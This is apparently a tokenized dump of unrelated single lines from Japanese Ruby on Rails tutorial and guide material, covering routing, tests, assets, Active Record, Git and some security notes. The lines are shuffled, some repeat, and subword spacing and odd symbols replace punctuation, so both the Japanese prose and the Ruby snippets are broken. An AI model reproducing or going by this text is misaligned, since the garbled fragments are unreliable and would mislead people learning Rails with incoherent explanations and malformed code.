▁ これはリスト \ ref { code : static _ page _ routes _ test } で使用されていました 。
▁最後に 、 この メール プレビュー のテスト も 作成 して 、 プレビュー を ダブルチェック できるようにします 。
▁ テストが 添 えられ ていない バグ レポート を見 かけ たら 、 貢献 の チ ャ ン ス です ▟ バグ が原因で 失敗する テスト を作成して 貢献 できます 。
▁たとえば 以下のコード 例 では 、 その テンプレート が アプリケーションで レンダリング される 場合 の 行 き 先 は アプリケーションの ` articles _ path ` になり 、 エンジン で レンダリング される 場合 の 行 き 先 は エンジンの ` articles _ path ` になります 。
▁0 ▖ ▖ 7 ) ▁# ▁=> ▁false
▁Rails の 特定の バージョン で しか 使 え ない 機能 の 記 述 を 減 ら し 、 その 分 、 Web 開発 全 般 で 通 用 する 原 理 原 則 について の 記 述 を 増 や しました 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁` weeks _ ago ` メソッドは 、 同じ要領で 週 に対して 行います 。
▁A ▁ generalized ▁\ k ode { authenticated ?}
▁resources ▁: comments
▁デフォルトは " ▁and ▁" です 。
▁これ を行なう ための サンプル コード をいくつか 掲 載 します 。
▁ 実際に 生成される CDN への フルパス は以下のようになります 。
▁ アセットを Gem に追加する
▁ mime _ type : ▁' application / x - g z ip ',
▁なお 本書 では 扱 いません が 、 CoffeeScript は エ レ ガ ン ト で 簡潔 な 言語 で 、 JavaScript に コンパイル して 実行 します
▁Web 経由で ユーザー を作成する 機能を これ から 追加します ので 、\ ref { sec : creating _ and _ authenticating _ a _ user } で作成した ユーザーを ここで 削除 しておきましょう 。
▁# ▁JavaScript と CSS を 圧縮 する
▁ このような 熱 心 で 多 様 な コ ミ ュ ニ テ ィ のおかげで 、 開発 中に 何らかの エラー に 遭遇 した としても 、 エラーメッセージ をそのまま Google で 検索 するだけで 、 関連する ブログ 記事 や 掲 示 板 の スレッド を た ち ど こ ろ に 見つけ ることができます 。
▁最後に 、 認可 ▁( authorization ) ▁ のための メソッドを アクション に追加し 、 Web サイト が セキュリティ モデル に従う ようにします 。
▁この節では 、 サンプルアプリケーション に スタイル を追加する ために 、 カスタム CSS ルール と Bootstrap を 組み合わせ て 使用します 。
▁この メールアドレス の 最適な 保存 方法は 、\ emph { 隠 し フィールド } として ページ 内に 保存 することです ▟ これにより 、 フォームを送信すると 他の 情報 と 一 緒 に メールアドレスが 送信されます 。
▁Contact ページ のテスト 。
▁今度は Blog アプリケーションに 新しく ▁ _ リソース _ ▁ を作成します 。
▁次に 、 リスト \ ref { code : micropost _ dependency } が正しく 動く かどうか 、 テスト を使って User モデルを 検証 してみます 。
▁ ドキュメント ルート からの 相 対 フルパス や URL を指定することもできます 。
▁ ユーザーが サインイン することで セキュリティ モデル も 実装 され 、 サインイン している ユーザー id に基づいて 、 特定の ページ へのアクセス を 制限 することもできます 。
▁これらの 追加 的な チェック 機能を まとめると 、 リスト \ ref { code : _ format _ jquery _ file _ test } のようになります 。
▁たとえば 、\ ref { sec : creating _ microposts } では 投 稿 フォーム に String 用の テキストフィールド ではなく て T ext 用の \ emph { テキスト エリア } を使う ため 、 より 自然な 投 稿 フォーム が 実現 できます 。
▁#### ▁email _ field _ tag
▁</ optgroup >
▁この \ k ode { user _ params } メソッドは Users コントローラの 内部で のみ 実行 され 、 Web 経由で 外部 ユーザーに さ ら される 必要はない ため 、 リスト { p 1 } に示すように Ruby の \ k ode { private } キーワード を使って {3} 外部 から 使用 できない {/3} ようにします
▁この 操作 によって 、 3 つの 文字列 から なる 配列 が 得られます 。
▁ トピックブランチを作成 後 、 README の内容を わかりやすく 書き換えて みましょう 。
▁なお 、\ k ode { unless } キーワード も同様に 使用できます 。
▁#### ▁ sanitize _ css ( style )
▁図 \ ref { fig : user _ show _ rails } の デバッグ情報 で \ k ode { params [: id ]} の 値を 確 認 できる ことにも注目してください 。
▁#### ▁text _ field _ tag
▁\ k ode { new } アクション を持つ 最初の Users コントローラ
▁この クラウド IDE には 他にも 、 Web 開発 に必要な 三 種 の 神器 である テキストエディタ 、 ファイル ブラウザ 、 コマンドライン ターミナル ▁( 図 \ ref { fig : ide _ an atom y }) ▁もし っかり 組み 込 んで あります 。
▁### ▁X - Sendfile ヘッダー
▁header 用の パーシャル
▁デフォルトでは 、 ファイルは ` public / video s ` から 読み込まれます 。
▁ 試 作 フィード のある Home ページ
▁\ ref { sec : git _ commands } で学んだ ことを思い出しましょう ▟ Git を使用する場合 は 、 master ブランチ で ずっと 作業 する の ではなく 、 その 都 度 トピックブランチを作成 して 作業 する のが よい 習慣 です 。
▁$ ▁git ▁pull ▁ JohnSmith ▁ o range
▁`: as ` オプションを使用することで 、 Rails が ルーティング に対して 生成する 名前付き ルーティングヘルパー 名 の冒頭 に 文字 を追加 できます ▁( プレフィックス ) 。
▁ 複数の JavaScript ファイルを キャッシュ して 1 つの ファイルに することができます ▟ こうすることで JavaScript ファイルの ダウンロード に必要な HTTP 接続 数を 減 ら す ことができ 、 速 度 が 向上 します ▟ g z ip 圧縮 すれば さらに 転 送 が 速 く なります 。
▁` app ` 以下の すべての サブディレクトリ と 、` config ▖ autoload _ paths ` で 指定した すべての パス が ` ActiveSupport :: Dependencies ▖ autoload _ paths ` に追加されます 。
▁ まず 、 Rails アプリケーションのルート ディレクトリ に移動し 、 新しい リポジトリ の 初期化 を行います 。
▁ 統合テスト と その他の テストを 区別 するには 、 Ruby の 定 番 である \ k ode { defined ?} メソッドを使用します ▟ このメソッドは 、 引数 の内容 が 定義されている 場合は true を 、 その他の 場合は false を返します 。
▁この ヘルパー には 、 一意性 チェック を 制限 するために 使用される 別の 属性 を指定する ための `: scope ` オプション があります 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ s ▁= ▁"< script > ▖▖▖ </ script > "▖ html _ safe
▁< ! - - [ if ▁ lt ▁ IE ▁ 9 ] >
▁orders ▖ find (▖▖▖)
▁リスト \ ref { code : flash _ persistence _ test } の 失敗する テストをパスさせ る には 、 本 編 のコード で \ k ode { flash } を \ k ode { flash ▖ now } に置き換え ます ▟ 後者は 、 レンダリング が 終 わ っている ページ で 特 別 に フラッシュメッセージ を表示する ことができます 。
▁ Follow / Unfollow ボタン をテストする
▁ これを行なうには 、` app / controllers / application ▖ rb ` に 以下のように 追 記 します 。
▁### ▁Gemfile ▖ lock を更新する
▁デフォルトは 以下の とおり です 。
▁ rm ▁- r f ▁< ディレクトリ 名 >
▁Web ブラウザ が 同時に 処理 できる リクエスト 数 には 限り がある ため 、 同 時 リクエスト 数を 減 ら す ことができ れば その 分 読み込み が 高速 になります 。
▁ データベースの レコードを 削除 したい場合 には 、 Active ▁Record の ` destroy ` メソッドを 呼 び ます 。
▁ 実際 、 上の ように 書 いて も 動作します ▟ しかし 、\ ref { sec : layout _ exercises } で 簡単に触れ た ように 、 アサーション \ k ode { assert _ equal } の 引数 は 、\ emph { 期 待 する 値 }、\ emph { 実際の 値 } の順序 で 書く のが ルール になっています 。
▁` demodulize ` メソッドは 、 フルパス の ▁( qualified ) ▁ 定数名 を与え られる と 、 パス 部分を 取り 除 いて 右 側 の 定数名 だけ に したものを 返します 。
▁m attr _ accessor ▁: load _ paths
▁ //= ▁require ▁m oo v in at or
▁ リクエストが 完了 すると 、 すべての ログ を フ ラ ッ シ ュ します 。
▁ jQuery は Rails ▁3▖1 以降 における デフォルトの JavaScript ライブラリ なので 、` jquery ▖ js ` を ` app / assets ` に 置 か なくても 自動的に 読み込まれます 。
▁` beginning _ of _ week ` メソッドと ` end _ of _ week ` メソッドは 、 それぞれ 週 の最初の 日付 と 週 の 最後の 日付 を返します 。
▁これらの CSS ルール が 一度 適用 される と 、 ユーザー登録ページ は 図 \ ref { fig : signup _ form } のようになります ▖
▁#### ▁ パーシャル に 名前 を与える
▁ 好 み に応じて 、 音 声 ファイル へのパス を直接 指定することもできます 。
▁route ▁resources ▁: microposts
▁ { ▁nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁: x ▁=> ▁: a ▁ } ▖ transform _ value s ▁ { ▁| value | ▁value ▖ to _ s ▖ upcase ▁ }
▁# ▁ attr i b s : ▁id , ▁name , ▁con t in ent _ id
▁ 例 :
▁ 以下 に すべての 使用 例 を示します 。
▁以下の ルーティング を設定し た とします 。
▁ これを行なうには 、` ajax : success ` イベント を バ イン ド します 。
▁これ を避けるために 、\ emph { 署 名 付き } cookie を使用します ▟ これは 、 cookie を ブラウザ に保存 する 前に 安全 に 暗号化 する ためのものです 。
▁ アプリケーションの 実装 と 実行
▁$ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁### ▁ 楽 観的ロック ▁( optimistic )
▁Users コントローラに リクエストが 正常に 送信される と 、\ k ode { params [: id ]} の 部分 は ユーザー id の \ text tt {1} に置き 換 わ ります ▟ 従って 、 この 箇所 は 以下の \ k ode { find } メソッドと 同等です 。
▁これで 基 礎 を 固 め る ことができ ました ので 、 リスト \ ref { code : feed _ final } のように もっと 効率 な フィード を実装する 準備ができました 。
▁C :: X ") ▁# ▁=> ▁true
▁=> ▁[1, ▁3 , ▁2 ]
▁ここでは ひ と まず マイクロポストを 1 つ か 2 つ 作成し 、 少なくとも 片 方 の \ k ode { user _ id } が \ k ode {1} になるように して 、\ ref { sec : a _ user _ tour } で作成した 最初の ユーザーの id と同じ に します 。
▁### ▁ セグメント を 制限 する
▁{0} 図 2▖ 8 {/0} ▁{1} 情報 が更新され た ユーザー {/1}
▁### ▁` start s _ with ?` と ` end s _ with ?`
▁### ▁ 主要な 機能
▁def ▁ bind ( object )
▁ これはリスト \ ref { code : password _ resets _ integration _ test } で使用されていました 。
▁ / contact
▁`: allow _ nil ` オプションは 、 対象 の 値が ` nil ` の 場合に バリデーション を スキップ します 。
▁これで すべての 要素 が 揃 った ので 、 プロフィール画面 に マイクロポストを 表示 させ てみましょう ▁( リスト \ ref { code : user _ show _ microposts }) 。
▁Date ▖ new (201 0, ▁5 , ▁24 )▖ weeks _ ago (2) ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁ アセット ファイル名 は 内容 が 変わる と 必ず 変 化 する ので 、 CDN 、 IS P 、 ネットワーク 機 器 、 Web ブラウザ など あらゆる 場 面 で 有効な キャッシュ を HTTP ヘッダ に設定する ことができます 。
▁ セキュア パスワード という 手法 では 、 各 ユーザーに パスワード と パスワード の 確 認 を 入力 させ 、 それを ▁( そのまま ではなく ) ▁\ emph { ハッシュ化 } したものを データベースに保存 します 。
▁array ▁= ▁[1, ▁[ 2, ▁3] ]
▁ ページ には ちゃんと エラーメッセージ が表示され ています が 、 ど こ が 問題 な のでしょうか 。
▁=> ▁[#< Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁ ╼ created _ at : ▁"2011- 11-0 3 ▁02:37:37" , ▁updated _ at : ▁"2011- 11-0 3 ▁02:37:37" > ,
▁ こ のうち ` helpers `、` mailers `、` models ` ディレクトリ には デフォルトでは 何も 置かれ ないので 、 本 セクション では 解説 しません 。
▁\ k ode { update _ attributes } メソッドは 属性 の ハッシュ を受け取り 、 成功 時に は 更新 と 保存 を 続けて 同時に 行います ▁( 保存 に成功した場合 は \ k ode { true } を返します ) 。
▁ マニフェストファイル
▁ そのため のコードは リスト \ ref { code : account _ activation _ preview } と 基本的に まったく 同じです ▁( リスト \ ref { code : password _ reset _ preview }) 。
▁\ ref { sec : objects _ and _ message _ passing } で 、\ k ode { ! !} ▁という 式 が 対応する 論理値 オブジェクト ▁( ! ! nil ▁=> ▁false ) ▁ に変換 されて いた ことを思い出してください 。
▁これ 実現 するためには 、 Rails と Ruby の 高度な 機能 の他に 、 SQL プログラミング の 技術 も 必要です 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option _ redux } の演習 の リスト \ ref { sec : signup _ exercises } の結果 を利用して います ▟ これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁JavaScript では 同 一 生成 元 ポ リ シ ー が 強制的に 適用 されます ▟ これは 、 ある ドメイン から 送 り 込 まれ た スクリプト から は 、 別の ドメイン の cookie にアクセス でき ないようにする ポ リ シ ー です 。
▁\ k ode { first _ user ▖ microposts } という コード を実行すると 、 そのユーザー に 関連付けられている マイクロポスト にアクセス できます ▟ このとき Active ▁Record は 、\ k ode { user _ id } が \ k ode { first _ user } の id ▁( ここでは \ k ode {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁ u ▖ occupation ▁= ▁" Code ▁Artist "
▁\ k ode { rake } コマンドで 使用 可能な タスク
▁ テストの 結果を 図 \ ref { fig : home _ root _ route } に示します 。
▁{0} 図 5 ▖3{/0}{1} Bootstrap ▁CSS と サンプルアプリケーション ▟\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ only _ bootstrap _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁has _ one ▁: account _ history , ▁through : ▁: account
▁ 完全な HTML 構造 を備えた About ページのビュー
▁INFO : ▁ _ CSS インジェクション は 実際には JavaScript の インジェクション である と 言えます ▟ これは 、 IE や 特定の バージョンの Safari など で 、 CSS に含まれる JavaScript の実行 が 許可 されている からです 。
▁ Calvin が Home ページに 戻 ると 、[ following ] ▁ カウント が 1 人 増え 、 Hobbes のマイクロポスト が ステータスフィード に表示される よう になっている ことがわかります ▁( 図 \ ref { fig : page _ flow _ home _ page _ feed _ mockup }) 。
▁ここで 重要な 点 があります ▟ Rails の アクション には 戻り値 が ありません ▟ 少なくとも 、 返される 値は 重要 ではありません 。
▁`: default s ` オプション に ハッシュ を 渡す ことで 、 これ 以外の デフォルト 設定 を定義する こともできます 。
▁ v i は 、 Unix で 古 く から 使用されている コマンド ベースの 強力な エディタ です ▟ V im は ▁" v i ▁improve d " ▁ の 略 です 。
▁ 例 :
▁ コレクション 出力 には 短縮 記 法 があります 。
▁` config ▖ action _ dispatch ▖ show _ exception s ` が ` false ` に設定され ている と 、 常に 例外 が出力されます 。
▁HTTP ▁request メソッド の詳細については \ ref { sec : getting _ started _ with _ testing } で説明します 。
▁たとえば イニシャライザ ▁( エンジン が 読み込まれる 前に 実行される コード ) ▁ を使用した い のであれば 、 そのため の 場所 である ` config / initializers ` フォルダ に 置きます 。
▁#### ▁ 名前付き 日付
▁* ▁` Rack :: Runtime ` は ` X - Runtime ` ヘッダー を設定します ▟ この ヘッダー には 、 リクエスト の実行 に か か る 時間 ( 秒 ) が含まれます 。
▁@ ips ▁= ▁ Blacklist ▖ re t ri e ve _ ips
▁` includes ` を指定すると 、 Active ▁Record は 指定された すべての 関連付け が 最小限 の クエリ 回 数 で 読み込まれる ように してくれます 。
▁ 公式 には 「 エ ス キュー エ ラ イ ト ▁( ess - c ue - e ll - ite )」 と発音します が 、( 本 来 は 誤り と されている ) 「 ス ィ ー ク ゥ エ ラ イ ト ▁( s equ el - ite )」 も よく 使われ ています 。
▁ ステータスフィード で 要求 される 設計 は リスト \ ref { code : full _ feed _ test } のテスト で 明 確 になった ので ▁( この テストにパス すれば 良い ので ) 、 早速 フィード の実装 に 着 手 してみましょう 。
▁ サイト を 正しく 防 衛 するには 、\ k ode { destroy } アクションに も アクセス制御 を行う 必要があります ▟ これを 実装 して よう や く 、 管理者 \ emph { だけ が } ユーザーを削除 できるようにします 。
▁User Mailer ▖ welcome (@ user )▖ deliver _ now
▁╼╼ ▁test ▁" should ▁get ▁help " ▁do ╼ ▁get ▁: help ╼ ▁ assert _ response ▁: success ╼ ▁ assert _ select ▁" title ", ▁" Help
▁self を省略した 結果を リスト \ ref { code : email _ downcase } に示します 。
▁ シングルクォート で 文字列を 囲 め ば 、 簡単に バ ッ ク スラッシュ 文字 のような 特 殊 文字 をそのまま 変数 に含め ることができます 。
▁ これによって 、 たとえば ログイン していない ユーザーが フォーム を使って 送信 した 場合 、 転 送 先 の URL を 保存 させ ない ように できます ▟ これは 稀 な ケース ですが 起こ り 得 ます ▟ たとえば ユーザ が セッション 用の cookie を 手動で 削除 して フォームから送信 する ケース など です 。
▁ 関連付け を使用する 理由
▁ 以下のように ブロック を使用し ない 記 述 も 可能です 。
▁ パスワード再設定の 統合テスト
▁`: message ` オプション を使用して エラーメッセージ を指定することもできます 。
▁たとえば 、 MySQL には ` LO C K ▁ IN ▁S HA RE ▁M O D E ` という 式 があります ▟ これは レコード の ロック 中に も 他の クエリ からの 読み出し は 許可 する ものです 。
▁Rails の ドキュメント に 貢献 する
▁ アプリケーションの ログ ファイル
▁| ▁GET ▁| ▁ / photos / new ▁| ▁images # new ▁| ▁new _ photo _ path ▁|
▁たとえば 、 new ページ と edit ページ の違い が ご く わずか しか ない のであれば 、 この 手法 を使用して コードの 重複 を 解 消 することができます 。
▁### ▁` valid ?` と ` invalid ?
▁これにより 、 ページの コンテンツ と タイトル の両方 に ユーザーの 名前 が含まれている かどうかを テスト できます 。
▁ デバッグ 表示 を 整 形 するための 追加 と 、 Sass の ミックスイン ▖
▁この ダ イ ア ログ ボックス の表示 は ` jquery _ ujs ` という JavaScript ファイル によって自動的に 行われます ▟ この ファイルは アプリケーションの 生成 時に 自動的に アプリケーション レイアウト ▁( ` app / views / layouts / application ▖ html ▖ erb ` ) ▁ に 含 まれ ます 。
▁{0}{1} 第 4 章 {/1}{/0} と同じ く 、 Rails コンソール を使用して データモデル を調べ てみましょう 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / anonymous ▖ rb ` です 。
▁ エンジン ▁( engine ) ▁ とは 、 アプリケーションの ミ ニ チ ュ ア のような もの であり 、 ホスト アプリケーションに 機能 を提供します 。
▁# ▁Run s ▁all ▁the ▁validations ▁within ▁the ▁specified ▁context ▖
▁ logout _ path
▁@ customer ▁= ▁@ order ▖ build _ customer ( customer _ number : ▁ 123 ,
▁ 削除リンク のテスト 。
▁use ▁ ActionDispatch :: Static
▁| ▁HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁class ▁ Third Part y Library :: C raw ler
▁< pre ▁class =' debug _ dump ' > ---
▁#### ▁ 各 種 変換
▁これ より サインイン モデル の実装 を開始 します ▟ 具体的には 、 サインイン 状態 を 「 永 続 化 」 し 、 ユーザーが 明示的に サインアウト したときに のみ セッションを 終 了 します 。
▁これで 、 削除 に関する コード に対して 、 よく テスト でき ている 状態 になりました ▟ テストスイート を 走 ら せる と ▁\ passing \ ▁ するはずです 。
▁最後に 、 統合テスト を 書き ます ▟ 今回の 統合テスト では 、 ログイン 、 マイクロポストの ページ 分割 の 確 認 、 無効な マイクロポストを 投 稿 、 有効な マイクロポストを 投 稿 、 マイクロポストの 削除 、 そして 他の ユーザーのマイクロポスト には ▁[ delete ] ▁ リンク が表示され ない ことを確認 、 といった 順 で テスト していきます 。
▁ 結果 として 、\ k ode { current \_ user } メソッドの 最終的な 評価 結果は 、 期待どおり \ k ode { nil } になります 。
▁しかし 実は 、 より 「 Ruby 的に 正しい 」 クラスメソッド の定義 方法 が 、 おそらく 2 とおり あります ▟ 1 つ は や や わ か り に く く 、 もう 1 つ は非常に 混 乱 する でしょう 。
▁ 各 ユーザー を表示する パーシャル
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁ どちらの オプション を使用する場合 であっても 、\ k ode { rails ▁server } コマンド の実行 は 別の ターミナル タブ で 行う ことをおすすめします ▟ こう しておけば 最初の ターミナル タブ で 他の コマンドを実行 できる からです 図 \ ref { fig : new _ term in al _ tab } と 図 \ ref { fig : rails _ server _ new _ tab } 。
▁なお 、\ emph { Rails ▁ チュートリアル } では 、 サンプルアプリケーションの 開発 を 中 心 に して 話 が 進 め ら れ ていきます が 、( サンプルアプリケーション に 特 化 した 技術 ではなく ) ▁Web ▁ アプリケーションの 開発 で 必要 になる 一般的な 技術 を 重 点 的に 解説 していきます ▟ このため 、 本書 を 読み 終 わ る 事 には 、 あなた が 今後 どんな ▁Web ▁ アプリケーションを 開発 したい のか に 関 わ らず 、 どんな 開発 にも 通 用 する 基 礎 的な 力 を 身につけ ることができます 。
▁ サイトに footer 用 CSS を追加する
▁2 番目の オプション 引数に ` false ` を渡すと 、 要素 の 個 数 の 少 ない グループ の 空 き は 詰 め られます 。
▁def ▁comment _ params
▁ 同様に ` max - age ` ▁ も この ヘッダ で CDN や ブラウザに 通知 されます ▟ ` max - age ` は 、 キャッシュ が オブジェクト を保存する 期間 を指定します ▟ この 期間 を 過 ぎ ると キャッシュ は 廃 棄 されます 。
▁\ k ode { - a } フラグ は 慎 重 に 扱 ってください ▟ 最後の コミット 後に 新しい ファイル を追加した 場合は 、 まず \ k ode { git ▁add } を実行して バージョン管理 下 に 置く 必要があります 。
▁HTTP は \ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # HTTP _ session _ state }{\ emph { ス テ ート レ ス な プロトコル } } であり 、 そのまま では 状態 が保存され ないので 、 Web アプリケーションの サインイン は 、 ページ から ページの 移動 を 追 跡 する という 方法で 実装 する必要があります 。
▁ これはリスト \ ref { code : initial _ signup _ test } で使用されていました 。
▁ 幸 い 、 フォーム 変数 \ k ode { f } を \ k ode { f ▖ object } と する ことによって 、 関連付けられたオブジェクト にアクセス することができます ▟ 従って 、 以下のコード の場合
▁以下は 、 上 と 同等の コード です 。
▁person ▖ errors ▖ size ▁# ▁=> ▁0
▁ attr _ accessor ▁: author _ name
▁ 値が ` nil ` や 空 文字 でない ( つまり 空欄 でも なければ ホワイトスペース でも ない ) ことを確認する ために 、 内部で は ` blank ?` メソッド を使用しています 。
▁* ▁`: delete ` を指定すると 、 関連付けられたオブジェクト はすべて データベースから 直接 削除 されます ▟ このとき コールバック は 実行 されません 。
▁ ありがたい ことに 、 Sessions コントローラ ▁(\ ref { sec : sessions _ controller }) ▁ を生成し た時点で 既に セッション 用 ヘルパー モジュール も ▁( 密 か に ) ▁ 自動生成 されています 。
▁\ ref { sec : a _ user _ class } の コンソール セッション では \ k ode { User ▖ new } で 新しい ユーザー オブジェクト を生成し ましたが 、 リスト \ ref { code : example _ user } の example _ user ファイルを 明示的に require する まで この オブジェクト には アクセス できません でした 。
▁これにより 、 モデルの テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するようになります 。
▁| ▁JSON ▁| ▁ パラメータ ▁|
▁これらの タグ は 、 レイアウト や 別の ビュー で使用する こともできます ▟ こ のうち 、` auto _ discover y _ link _ tag `、` javascript _ include _ tag `、` stylesheet _ link _ tag ` は レイアウト の ` < head >` セクション で使用する のが普通です 。
▁</ header >
▁ これを 解 消 するために 両者 を更新し て 、 新しい 一般的な メソッド を使用する ようにします ▁( リスト \ ref { code : generalized _ current _ user } と リスト \ ref { code : test _ authenticated _ invalid _ token _ updated }) 。
▁Rails アプリケーション 内 や Rails エンジン 内の JavaScript ファイルは 、` app / assets `、` lib / assets `、` vendor / assets ` のいずれか の 場所 に置かれ ます 。
▁{0} Figure ▁2▖ 15 : ▁{/0}{1} The ▁association ▁between ▁microposts ▁and ▁users ▖ {/1}
▁ 同様に 、 アプリケーション 新規 作成 時に ` - - skip - sprockets ` オプション を指定すると ` config / application ▖ rb ` ファイルの 記 述 内容 が デフォルト から 若 干 異なります ▟ 具体的には s proc k e t ▁ ra i lt i e で 必要となる 記 述 が コメントアウト されます 。
▁これは 本質的に 、 アプリケーション と エンジン が 完全に 同 一 の名前 のルーティング を持つ ことができ 、 しかも 衝 突 しない という ことを意味します 。
▁ とは い う もの の 今は 無 理 は 禁 物 です ▟ この テストでは また いくつか 新しい アイディア を 投 入 する 必要 も あるので 、 テスト 作成 は \ ref { sec : layout _ link _ tests } に 回 す ことにします 。
▁### ▁ ミドルウェア を理解する
▁* ▁` has _ many `
▁( TextMate は M ac ▁OS ▁X 版 しか ありません が 、 M ac ユーザー にとって は TextMate は 現在 でも 良い 選択 である と 言えます ▟)
▁d c : creator ", ▁item ▖ author _ name ) ▁if ▁item _ has _ creator ?(
▁この ` to _ formatted _ s ` メソッドは 、 " F " のデフォルトの 指定 部 ▁( spec if i er ) ▁ を提供します 。
▁* ▁` config ▖ active _ record ▖ pluralize _ table _ name s ` は 、 Rails が 探 す データベースの テーブル名 を 単数形 に するか 複数形 に するか を指定します 。
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ s ▁# ▁=> ▁" 5▖0 "
▁この 機能 の使用 法 については [ send _ file ]( http :// api ▖ rubyonrails ▖ org / classes / ActionController / Data S tr ea m ing ▖ html # method - i - send _ file ) を参照してください 。
▁ テスト 時に メール送信 を 抑 制 するのに 便利です 。
▁Using ▁RSpec
▁User モデルと ユーザー登録 機能 の開発 が終わった ので 、 今度は この サンプルアプリケーション を 本番 ▁( production ) ▁ 環境 に 展開 しましょう
▁Time ▖ zone _ default
▁Rails の モデル は 、 単数形 の名前 を 持ち 、 対応する データベース テーブル名 は 複数形 で 表 される という ルール があります 。
▁# ▁ここで すべての 初期化 を行なう
▁ これはリスト \ ref { code : signin _ success _ tests } で使用されていました 。
▁* ▁Ruby ▁on ▁Rails セキュリティ プロジェクト には 定 期 的に セキュリティ 情報 が 掲 載 されます : ▁[ http :// www ▖ r or security ▖ info ]( http :// www ▖ r or security ▖ info )
▁WARNING : ▁この ガイド は Rack の ミドルウェア 、 url マ ッ プ 、` Rack :: Builder ` といった Rack の プロトコル や 概念 に関する 実 用 的な 知識 がある ことを 前 提 に しています 。
▁このオプション は 、 デフォルトでは 以下のように 設定 されます 。
▁この ルーティング は 、` You r App :: Application ` クラス ではなく ` Blorgh :: Engine ` オブジェクト にも と づ いて いることにご注目ください 。
▁もし テストスイート が 理由 も なく 壊 れる ようなことがあ れば 、\ k ode { rake ▁test : prepare } を実行して 、 この問題 が 解決 するか 確認し てみてください 。
▁ 一致し ない場合 、 例外 は キ ャ プ チ ャ されません 。
▁ メール フォーマット の検証 に対するテスト ▁( ▁\ failing ▁ )
▁ 隠 れ ている \ k ode { ▖ gitignore } ファイル を表示する
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁この節では 、 ユーザーを削除する ための リンク を追加します ▟ モックアップ を 図 \ ref { fig : user _ index _ delete _ links _ mockup } に示します ▟ また 、 削除 を行う の に必要な \ k ode { destroy } アクション も 実装します 。
▁ //= ▁require ▁ phone box
▁` in _ groups _ of ` メソッドは 、 指定 の サイズ で 配列 を 連続 した グループ に 分割 します 。
▁ レイアウト や スタイル が 整 って いない 。
▁`: o mis s ion ` オプション を指定する ことで 、 省略 文字 ▁( . . . ) ▁ を カスタマイズ することもできます 。
▁` exists ?` メソッドは 、 引数 なしで モデル や リレーション に使用する こともできます 。
▁ アクション
▁ 有効な ユーザーの フィクスチャ を作成 できたので 、 テストで 以下のように フィクスチャ データ を参照 できます 。
▁\ ref { sec : up _ and _ running } でも 述 べ ている ように 、 本チュートリアル では Unix コマンドライン を 最初から 利用できる クラウド 開発環境 の 利用 ▁(\ ref { sec : development _ environment }) ▁ を 、 すべての OS ユーザー ▁( 特に Windows ) ▁ の方 に お す す め しています 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ first _ name ▁= ▁' N ic k ') ▁LIMIT ▁1
▁\ k ode { - m } フラグ を使用すると 、 コミットメッセージ を コマンドラインで 直接 指定 できます ▟\ k ode { - m } フラグ を使用し ない場合は システム のデフォルトの エディタ が 開 き 、 そこで コミットメッセージ を 入力 します
▁これらの ページ の中で 最も 重要な 、 Home ページのモックアップ を 図 \ ref { fig : home _ page _ mockup } に示します 。
▁{0} 第 {1} 3 {/1} 章 {/0} では 静的なページ を作成し 、 そこに 動的な 要素を 順 次 追加 していきます 。
▁Rails コ ミ ュ ニ テ ィ には 、 何 百 人 もの オープンソース \ href { http :// contributors ▖ rubyonrails ▖ org /}{ コ ン ト リ ビュー タ } や 、 多くの 参 加 者 で 賑 わ う \ href { http :// rails con f ▖ com /}{ カ ン フ ァ レ ン ス } 、 膨大な 数 の \ href { https :// rubygems ▖ org /}{ gem } ▁( ページネーション や 画像アップロード といった 特定の 問題 を解決する ための gem など ) 、 多くの 情報を 発 信 し 続ける ブログ 、 掲 示 板 、 I R C があります 。
▁### ▁Action ▁View を設定する
▁* ▁` action _ controller ▖ compile _ config _ methods `: ▁ 指定された 設定 用 メソッドを 初期化 し 、 より 高速 にアクセス できるようにします 。
▁protect _ from _ forgery
▁ ドット
▁#### ▁ リ バー ス プロキシ を使用する
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、\ href { https :// en ▖ w ikipedia ▖ org / wiki / Internet _ media _ type } { MIME タイプ } で 指定 する ようにします 。
▁たとえば 、 サーバー への リクエスト に含まれる 新規 投 稿 送信 フォーム に 、 も とも と フォーム に なかった フィールド が 攻撃者 によって 密 か に 追加 され 、 それが アプリケーションの 整 合 性 を 脅 か す 可能性 が考えられます 。
▁\ k ode { - a } フラグ は 慎 重 に 扱 ってください ▟ 最後の コミット 後に 新しい ファイル を追加した 場合は 、 まず \ k ode { git ▁add } を実行して バージョン管理 下 に 置く 必要があります 。
▁上の 指定 により 、` M a g ical :: Uni c or n s ` ミドルウェア が スタック の最後 に追加されます 。
▁| ▁ ファイル ▁| ▁ 目的 ▁|
▁ここでは \ k ode { each } メソッドを使用して これ を行います ▟ それぞれの 行 を リスト タグ \ k ode { ul } で 囲 い ながら 、 各 ユーザーの Gravatar と 名前 を表示します ▁( リスト \ ref { code : user _ index _ view }) 。
▁ここでは 、 リスト { p 0} のように {2} gravatar _ for {/2} ヘルパー メソッドを使用して Gravatar の 画像 を 利用 できるようにします 。
▁ これはリスト \ ref { code : nested _ hashes } で使用されていました 。
▁@ orders ▖ each ▁do ▁| order |
▁12345678▖ to _ s (: delimited ) ▁# ▁=> ▁12,345,678
